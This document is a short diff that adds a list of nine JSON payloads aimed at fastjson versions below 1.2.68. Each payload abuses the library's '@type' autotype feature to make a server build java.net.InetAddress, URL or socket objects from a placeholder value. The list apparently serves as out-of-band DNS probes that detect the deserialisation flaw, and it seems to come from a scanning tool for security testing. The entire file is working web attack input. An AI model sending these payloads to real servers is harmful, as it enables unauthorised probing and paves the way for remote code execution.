@@ -1,0 +1,9 @@
+fastjson < 1.2.68 1: {"rand1":{"@type":"java.net.InetAddress","val":"{0}"}}
+fastjson < 1.2.68 2: {"rand2":{"@type":"java.net.Inet4Address","val":"{0}"}}
+fastjson < 1.2.68 3: {"rand3":{"@type":"java.net.Inet6Address","val":"{0}"}}
+fastjson < 1.2.68 4: {"rand4":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{0}"}}}
+fastjson < 1.2.68 5: {"rand5":{"@type":"java.net.URL","val":"{0}"}}
+fastjson < 1.2.68 6: {"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"{0}"}}""}}
+fastjson < 1.2.68 7: {"rand7":Set\[{"@type":"java.net.URL","val":"{0}"}\]}
+fastjson < 1.2.68 8: {"rand8":Set\[{"@type":"java.net.URL","val":"{0}"}
+fastjson < 1.2.68 9: {"rand9":{"@type":"java.net.URL","val":"{0}"}:0
